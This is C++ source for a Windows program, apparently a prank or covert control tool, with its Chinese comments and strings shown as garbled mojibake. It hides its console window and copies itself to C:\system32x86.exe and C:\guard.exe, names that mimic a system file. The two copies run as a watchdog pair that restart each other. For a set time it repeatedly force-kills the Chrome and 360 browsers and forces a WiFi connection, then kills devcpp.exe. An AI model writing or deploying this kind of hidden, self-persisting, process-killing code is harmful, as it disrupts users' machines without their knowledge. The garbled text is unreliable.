
#include <bits/stdc++.h>
#include <windows.h>
#include <TlHelp32.h>
using namespace std;
HWND hwnd = GetForegroundWindow();
void HideWindow() {
    ShowWindow(hwnd, SW_HIDE);
}

HANDLE GetProcessHandle(int nID)
{
	return OpenProcess(PROCESS_ALL_ACCESS, FALSE, nID);
}
 
//ͨ��������������׺.exe����ȡ���̾��

BOOL FindProcess()
{
	int i=0;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32); 
	HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(hProcessSnap == INVALID_HANDLE_VALUE)
	{
		i+=0;
	}
	BOOL bMore = ::Process32First(hProcessSnap, &pe32);
	while(bMore)
	{
		//printf(" �������ƣ�%s \n", pe32.szExeFile);
		if(stricmp("system32x86.exe",pe32.szExeFile)==0)
		{
			//printf("����������");
			i+=1;
		}
		bMore = ::Process32Next(hProcessSnap, &pe32);
	}
	if(i >=	1){           //����1���ų�����
		return true;
	}else{
		return false;
	}
	CloseHandle(hProcessSnap);
}
char wifi[120]={"netsh wlan connect name =  "};
int main(int argc,char *argv[]) {
	if(argc == 3){
		HideWindow();
		Sleep(1000);
		int cnt = 0; 
		while(1){
			Sleep(1000);cnt ++;
			if(FindProcess() == false){
				system("start C:\\system32x86.exe -t");
			}
			if(cnt == 1437){
				char s[800] = {};
				sprintf(s,"start %s -g -n\0",argv[0]); 
				system(s);
				exit(0);
			}
		}
		exit(0);
	}
	if(argc == 1){
		HideWindow();
		char cmd[800] = {};
		sprintf(cmd,"copy %s C:\\system32x86.exe",argv[0]);
		system(cmd);
		sprintf(cmd,"copy %s C:\\guard.exe",argv[0]);
		system(cmd);
		printf("dog:");
		system("start C:\\guard.exe -g -n");
		exit(0);
	}
	if(argc == 2){
		SetWindowText(hwnd, "Windows ���������");
		printf("������ʱ���룺\n");
		int dd,mm,ss;
		long long  times;
		scanf("%dʱ%d��%d��",&dd,&mm,&ss);
		printf("������WiFi���ƣ�\n");
		scanf("%s",wifi+26);
		HideWindow();
		times = (dd*3600+mm*60+ss)*1e9; 
		freopen("nul","w",stdout);
		freopen("nul","r",stdin);
		long long t = chrono::system_clock::now().time_since_epoch().count();
		mt19937 gen(chrono::system_clock::now().time_since_epoch().count());
		uniform_int_distribution<> random(1,1e6);
		system("@echo off");
		while(1){
			if(random(gen)==1437){
				system("taskkill /f /im chrome.exe > nul");
				system("taskkill /f /im 360se.exe > nul");
				system("taskkill /f /im 360chrome.exe > nul");
				system(wifi); 
			}
			if(t + times < chrono::system_clock::now().time_since_epoch().count())break;
		}	
		system("taskkill /f /im guard.exe");
		MessageBox(NULL,"ʱ�䵽�ˣ�\n��ɵ�ơ�","����",MB_OK);
		system("taskkill /f /im devcpp.exe");
		exit(0);
	}
//	system("cmd");
	return 0;
}
